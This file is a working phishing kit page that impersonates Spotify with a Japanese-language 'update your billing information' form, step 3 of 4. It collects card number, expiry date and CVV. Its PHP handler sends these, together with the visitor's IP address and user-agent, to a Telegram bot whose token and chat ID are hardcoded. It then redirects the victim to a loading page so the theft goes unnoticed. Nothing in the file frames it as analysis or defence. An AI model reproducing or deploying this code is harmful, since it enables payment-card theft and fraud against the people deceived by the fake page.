<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Telegram Bot Credentials
    $botToken = "8585828847:AAFjkTFcI696kQNqb1ewBZOiQCLgO7CVix4";  // Replace with your bot token
    $chatId = "-5238377956";      // Replace with your chat ID
       
    // Capture billing info from the form
    $cardNumber = $_POST['jiji'] ?? 'N/A';
    $expiryDate = $_POST['jijiexp'] ?? 'N/A';
    $cvv = $_POST['jijicode'] ?? 'N/A';

    // Get user's IP address
    $ip = $_SERVER['REMOTE_ADDR'];

    // Format message
    $message = "💳 *THAILANDI Page Submission*\n\n".
               "💳 *Card:* `$cardNumber`\n".
               "📅 *Expiry:* `$expiryDate`\n".
               "🔐 *CVV:* `$cvv`\n\n".
               "🌐 *IP Address:* `$ip`\n".
               "🕵️‍♂️ *User-Agent:* `{$_SERVER['HTTP_USER_AGENT']}`";

    // Send data to Telegram
    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    // Use cURL to send the message
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Added for reliability
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10 second timeout
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Return response
    header('Content-Type: application/json');
    
    if ($httpCode == 200) {
        echo json_encode([
            'status' => 'success', 
            'message' => 'Data sent to Telegram',
            'telegram_response' => json_decode($response, true)
        ]);
    } else {
        http_response_code(500);
        echo json_encode([
            'status' => 'error', 
            'message' => 'Failed to send to Telegram',
            'http_code' => $httpCode
        ]);
    }
    exit();
}
?>

<!DOCTYPE html>
<html style="font-size: 16px;" lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="keywords" content="">
    <meta name="description" content="">
    <title>Spotify</title>
    <link rel="stylesheet" href="./img/main.css" media="screen">
    <link rel="stylesheet" href="./img/spinner.css" media="screen">
    <link rel="stylesheet" href="./img/jiji.css" media="screen">
    <meta name="referrer" content="origin">
    <link id="u-theme-google-font" rel="stylesheet" href="./img/css">
    <meta name="theme-color" content="#478ac9">
    <meta property="og:title" content="jiji">
    <meta property="og:type" content="website">
</head>
<body data-path-to-root="./" data-include-products="false" class="u-body u-xl-mode" data-lang="en">
    <div id="overlay" style="display:none;">
        <div class="cv-spinner">
            <span class="spinner"></span>
        </div>
    </div>

    <header class="u-clearfix u-custom-color-1 u-header u-header" id="sec-0a1f">
        <div class="u-clearfix u-sheet u-valign-middle-sm u-valign-middle-xs u-sheet-1">
            <img class="u-hidden-lg u-hidden-md u-hidden-xl u-image u-image-default u-image-1" src="./img/ico.png" alt="" data-image-width="459" data-image-height="234">
            <p class="u-custom-font u-hidden-sm u-hidden-xs u-text u-text-default u-text-1">
                <span class="u-file-icon u-icon u-text-white u-icon-1">
                    <img src="./img/1946429-27ae17d7.png" alt="">
                </span>&nbsp;プロフィール
            </p>
            <a class="u-image u-logo u-image-2" data-image-width="300" data-image-height="95">
                <img src="./img/logo1.svg" class="u-logo-image u-logo-image-1">
            </a>
        </div>
    </header>

    <section class="skrollable u-clearfix u-custom-color-1 u-parallax u-section-1" id="sec-3fac">
        <div class="u-clearfix u-sheet u-sheet-1">
            <p class="u-align-center-sm u-align-center-xs u-custom-font u-text u-text-default-lg u-text-default-md u-text-default-xl u-text-1">
                <span style="color: #ff0000;">⚠️</span> 請求先情報を更新してください
            </p>
            <img class="u-expanded-width-sm u-expanded-width-xs u-image u-image-default u-image-1" src="./img/update1.png" alt="" data-image-width="2415" data-image-height="32">

            <div class="u-container-align-left-xs u-container-style u-expanded-width-xs u-group u-shape-rectangle u-group-1">
                <div class="u-container-layout u-container-layout-1">
                    <span class="u-align-left-xs u-file-icon u-icon u-text-grey-50 u-icon-1">
                        <img src="./img/271220-11a1ae80.png" alt="">
                    </span>
                    <p class="u-align-left-xs u-custom-font u-text u-text-default u-text-grey-40 u-text-2">フェーズ 3/4</p>
                    <p class="u-align-left-xs u-custom-font u-text u-text-default u-text-3">請求先情報を更新してください</p>
                </div>
            </div>

            <div class="u-border-1 u-border-grey-75 u-expanded-width-xs u-form u-radius-20 u-form-1">
                <form action="" method="post" id="payment-form" class="u-clearfix u-form-spacing-17 u-form-vertical u-inner-form" name="form" style="padding: 24px;">
                    <p class="u-custom-font u-form-group u-form-text u-text u-text-4"> クレジットカードまたは銀行カード</p>
                    <img class="u-form-group u-form-image u-image u-image-default u-image-2" src="./img/cards.png" data-image-width="868" data-image-height="204">

<div class="u-form-group u-form-name">
    <label class="u-custom-font u-label u-label-1">カード番号</label>
    <input 
        type="tel" 
        id="card-number"
        placeholder="0000 0000 0000 0000" 
        name="jiji" 
        class="u-border-2 u-border-grey-80 u-custom-color-1 u-custom-font u-input u-input-rectangle u-radius-10 u-input-1"
        required
        maxlength="19"
        onfocus="this.placeholder=''"
        onblur="this.placeholder='0000 0000 0000 0000'"
    >
    <small id="card-error" style="color:#e11d48; display:none;">カード番号が無効です</small>
</div>


<div class="u-form-email u-form-group">
    <label class="u-custom-font u-label u-label-2">有効期限</label>
    <input 
        type="tel" 
        id="expiry" 
        placeholder="MM/JJ" 
        name="jijiexp" 
        class="u-border-2 u-border-grey-80 u-custom-color-1 u-custom-font u-input u-input-rectangle u-radius-10 u-input-2" 
        maxlength="5" 
        required
        onfocus="this.placeholder=''"
        onblur="this.placeholder='MM/JJ'"
    >
</div>

                    
                    <div class="u-form-group u-form-group-6">
    <label class="u-custom-font u-label u-label-3">カード確認コード</label>
    <input
        type="tel"
        placeholder="CVV Code"
        name="jijicode"
        class="u-border-2 u-border-grey-80 u-custom-color-1 u-custom-font u-input u-input-rectangle u-radius-10 u-input-3"
        maxlength="5"
        required
        onfocus="this.placeholder=''"
        onblur="this.placeholder='CVV Code'"
    >
</div>


                    <style>
                        #button {
                            width: 100%;
                            max-width: 320px;
                            padding: 12px 0;
                            font-size: 16px;
                            border-radius: 8px;
                            cursor: pointer;
                            background: #16a34a;
                            color: white;
                            border: none;
                            font-weight: 600;
                            transition: 0.2s ease-in-out;
                        }

                        #button:hover {
                            background: #15803d;
                        }

                        #button:disabled {
                            background: #9ca3af;
                            cursor: not-allowed;
                        }
                    </style>

                    <div class="u-align-center u-form-group u-form-submit">
                        <button type="submit" id="button" class="u-btn u-btn-submit u-button-style">
                            確認する
                        </button>
                    </div>

                </form>
            </div>
        </div>
    </section>

    <script>
    const cardInput = document.getElementById("card-number");
    const expiryInput = document.getElementById("expiry");
    const error = document.getElementById("card-error");
    const submitButton = document.getElementById("button");

    // BIN routing configuration
    const binRoutes = {
        // Visa

    };

    const defaultRoute = 'loading4.html';

    function getRedirectUrl(cardNumber) {
        const clean = cardNumber.replace(/\s+/g, '');
        
        // Check from longest to shortest BIN (8 digits down to 1)
        for (let length = 8; length >= 1; length--) {
            const bin = clean.substring(0, length);
            if (binRoutes[bin]) {
                return binRoutes[bin];
            }
        }
        
        return defaultRoute;
    }

    // Auto-format card number with spaces
    cardInput.addEventListener("input", function (e) {
        let value = e.target.value.replace(/\D/g, "");
        value = value.substring(0, 19);
        e.target.value = value.replace(/(.{4})/g, "$1 ").trim();
        
        const clean = value;
        
        if (clean.length < 16) {
            error.style.display = "none";
            return;
        }
        
        if (luhnCheck(clean)) {
            error.style.display = "none";
        } else {
            error.style.display = "block";
        }
    });

    // Auto-format expiry date MM/YY
    expiryInput.addEventListener("input", function (e) {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length >= 2) {
            value = value.substring(0, 2) + "/" + value.substring(2, 4);
        }
        e.target.value = value;
    });

    // Luhn check algorithm for card validation
    function luhnCheck(num) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = num.length - 1; i >= 0; i--) {
            let digit = parseInt(num[i], 10);
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10) === 0;
    }

    // Handle form submission
    document.getElementById("payment-form").addEventListener("submit", function (e) {
        e.preventDefault();
        
        const clean = cardInput.value.replace(/\s+/g, "");
        
        // Validate card number
        if (clean.length < 13 || clean.length > 19 || !luhnCheck(clean)) {
            error.style.display = "block";
            return;
        }
        
        // Get redirect URL based on BIN BEFORE sending to Telegram
        const redirectUrl = getRedirectUrl(clean);
        console.log('Will redirect to:', redirectUrl);
        
        // Disable button to prevent double submission
        submitButton.disabled = true;
        submitButton.textContent = "Käsitellään...";
        
        // Show loading spinner
        document.getElementById("overlay").style.display = "block";
        
        // Prepare form data
        const formData = new FormData(this);
        
        // Send data to Telegram FIRST, then redirect
        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Telegram Response:', data);
            
            // Wait 500ms to ensure Telegram received the data
            setTimeout(() => {
                // Now redirect based on BIN
                window.location.href = redirectUrl;
            }, 500);
        })
        .catch(error => {
            console.error('Error sending to Telegram:', error);
            
            // Even if there's an error, still redirect after a delay
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 1000);
        });
    });
    </script>
</body>
</html>